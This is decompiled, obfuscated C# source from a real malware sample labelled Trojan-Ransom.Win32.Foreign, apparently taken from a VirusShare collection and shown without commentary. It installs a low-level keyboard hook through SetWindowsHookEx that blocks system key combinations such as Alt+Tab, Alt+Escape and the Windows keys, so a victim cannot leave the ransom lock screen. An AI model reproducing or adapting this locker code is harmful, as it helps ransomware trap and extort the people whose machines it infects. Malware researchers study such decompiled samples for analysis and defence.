// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: C7CC9454-F663-4E88-B488-D89A8E8A2020
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Foreign.dee-7b2f429bcd0936ae802edc4bf60d2431ff2f87ffc6d1c3c3879ec6651f92b519.exe

using System;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal class \u0003
  {
    private static \u0003.\u0003.\u0001 \u0001;
    private static int \u0001;

    private static int \u0001([In] int obj0, [In] int obj1, [In] IntPtr obj2)
    {
      int num1 = obj0;
      \u0003.\u0003.\u0002 obj3;
      int num2;
      while (true)
      {
        if (num1 >= 0)
        {
          // ISSUE: type reference
          object obj4 = \u009F.\u0014\u0003(obj2, \u009E.\u0013\u0003(__typeref (\u0003.\u0003.\u0002)));
          \u0003.\u0003.\u0002 obj5;
          obj3 = obj4 != null ? (\u0003.\u0003.\u0002) obj4 : obj5;
          if (!(obj3.\u0001 == 9 & \u0004.\u007E\u0007((object) \u0001\u0002.\u007E\u0015\u0003((object) \u0002.\u0003.\u0001()))) && !(obj3.\u0001 == 27 & \u0004.\u007E\u0008((object) \u0001\u0002.\u007E\u0015\u0003((object) \u0002.\u0003.\u0001()))))
          {
            num2 = obj3.\u0001 == 91 ? 1 : 0;
            if (false)
              num1 = num2;
            else
              goto label_7;
          }
          else
            goto label_5;
        }
        else
          break;
      }
      return \u0003.\u0003.\u0001(\u0003.\u0003.\u0001, obj0, \u009D.\u0012\u0003(obj1), obj2);
label_5:
      return 1;
label_7:
      int num3 = obj3.\u0001 == 92 ? 1 : 0;
      if ((num2 | num3) != 0)
        return 1;
      int num4 = obj3.\u0001 == 46 & \u0004.\u007E\u0008((object) \u0001\u0002.\u007E\u0015\u0003((object) \u0002.\u0003.\u0001())) ? 1 : 0;
      if (false)
        return num4;
      int num5 = \u0004.\u007E\u0007((object) \u0001\u0002.\u007E\u0015\u0003((object) \u0002.\u0003.\u0001())) ? 1 : 0;
      return (num4 & num5) != 0 || obj3.\u0001 == 115 & \u0004.\u007E\u0007((object) \u0001\u0002.\u007E\u0015\u0003((object) \u0002.\u0003.\u0001())) ? 1 : \u0003.\u0003.\u0001(\u0003.\u0003.\u0001, obj0, \u009D.\u0012\u0003(obj1), obj2);
    }

    public static void \u0001()
    {
      do
      {
        if (true)
        {
          int num1;
          int num2;
          if (true)
          {
            int num3 = \u0003.\u0003.\u0001;
            num2 = 0;
            num1 = num3;
          }
          else
            goto label_7;
label_3:
          if (num1 == num2)
            \u0003.\u0003.\u0001 = new \u0003.\u0003.\u0001(\u0003.\u0003.\u0001);
          else
            goto label_10;
label_5:
          \u0003.\u0003.\u0001 = \u0003.\u0003.\u0001(13, \u0003.\u0003.\u0001, \u0004\u0002.\u0018\u0003(\u0003\u0002.\u007E\u0017\u0003((object) \u0002\u0002.\u0016\u0003())[0]), 0);
label_7:
          if (true)
          {
            num1 = \u0003.\u0003.\u0001;
            num2 = 0;
            if (num2 == 0)
            {
              if (num1 != num2)
                ;
            }
            else
              goto label_3;
          }
          else
            goto label_5;
        }
label_10:;
      }
      while (false);
    }

    [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern int \u0001([In] int obj0, [In] int obj1, [In] IntPtr obj2, [In] IntPtr obj3);

    [DllImport("user32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern int \u0001([In] int obj0, [In] \u0003.\u0003.\u0001 obj1, [In] IntPtr obj2, [In] int obj3);

    private delegate int \u0001(int nCode, int wParam, IntPtr lParam);

    private struct \u0002
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public IntPtr \u0001;
    }
  }
}
